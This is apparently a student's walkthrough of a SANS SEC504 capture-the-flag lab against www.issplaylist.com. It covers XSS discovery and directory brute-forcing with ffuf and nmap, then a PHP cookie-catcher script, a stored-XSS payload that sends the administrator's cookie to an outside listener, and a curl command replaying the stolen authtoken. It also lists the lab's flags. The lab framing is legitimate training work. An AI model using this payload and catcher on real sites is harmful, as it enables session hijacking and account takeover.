# SEC504 Ranges.io CTF - Walkthrough

This document contains my step-by-step solutions for the **www.issplaylist.com** section challenges.  
Each section includes **question**, **steps taken**, and **answer/flag**.

---

## Contact
**Question:**  
Interact with the contact form on the www.issplaylist.com website. What is the flag returned as the reference number?

**Steps Taken:**
I navigated to <https://www.issplaylist.com/contact.html> and typed `Mike` into the First Name box. After clicking **Submit**, the page responded with a reference number, which was the flag I needed.  

**Flag:**  
`NetWars{ReceivedSubmission}`

---

## Vulnerability Discovery
**Question:**  
Explore the Contact page on the www.issplaylist.com website to identify a vulnerability. Identify the type of vulnerability.

**Steps Taken:**
At first, I tested for **command injection** in every form field. Nothing interesting came back, so I moved on. Next, I decided to test for **Cross-Site Scripting (XSS)**, since it made the most sense for a form like this. I submitted the following payload:  

```html
Mike<script>alert(1)</script>
```

The result was immediate — a popup alert appeared, confirming an XSS vulnerability.  

**Answer:**  
`Cross-Site Scripting`

---

## Information Gathering
**Question:**  
Identify the hidden page on the www.issplaylist.com server. Submit the page name (XXXXX.html).

**Steps Taken:**
I launched **ffuf** to brute force potential directories:  

```bash
ffuf -w common.txt -u https://www.issplaylist.com/FUZZ -s -mc 200,301
```

The results showed: `admin`, `images`, `index.html`, and `res`. Testing them manually:  
- `images` and `res` returned Forbidden  
- `index.html` loaded fine (the main page)  
- `admin` loaded successfully, revealing the hidden admin page  

As an alternative, I knew I could also use Nmap’s `http-enum` script:  

```bash
nmap -n --script=http-enum www.issplaylist.com
```

But ffuf already confirmed the answer.  

**Answer:**  
`admin.html`

---

## Cookie Theft
**Question:**  
Administrators for the www.issplaylist.com site frequently examine the contact page submissions using their browsers. Exploit the site vulnerability to steal cookie content from the administrator. What is the name of the cookie used to authenticate administrative users?

**Steps Taken:**
I leveraged the XSS vulnerability I had already discovered. To capture the admin’s cookie, I used a PHP cookie catcher script, modified from the course lab:  

```php
<?php
// Build log entry
$data = [
    'GET'     => $_GET,
    'POST'    => $_POST,
    'headers' => function_exists('getallheaders') ? getallheaders() : [],
];

// Convert to JSON
$json = json_encode($data, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);

// Append to cookies.log
file_put_contents("cookies.log", $json . PHP_EOL, FILE_APPEND);

// Print to terminal if STDOUT is defined
if (defined('STDOUT')) {
    fwrite(STDOUT, $json . PHP_EOL);
}

// Send no content back to browser
http_response_code(204);
exit;
?>
```

I started a listener with:  

```bash
php -S 0.0.0.0:8080
```

Then, I submitted this payload into the First Name field:  

```html
Mike<script>document.location="http://10.142.148.3:8080/" + document.cookie</script>
```

When the admin later opened the submissions, their authentication cookie was sent to my listener. In my test, the cookie log showed:  

```
/authtoken=0f186582606b62965d90e772e76a8a5620b11af9
```

This confirmed the cookie name was `authtoken`.  

**Answer:**  
`authtoken`

---

## Unauthorized Access
**Question:**  
Use the stolen cookie to access the admin page. Submit the flag.

**Steps Taken:**
I took the stolen cookie and used it with `curl` to access the hidden admin page:  

```bash
curl -k -b "authtoken=0f186582606b62965d90e772e76a8a5620b11af9" https://www.issplaylist.com/admin.html | grep -i NetWars
```

The output included the flag:  

**Flag:**  
`NetWars{CongratsAdmin}`

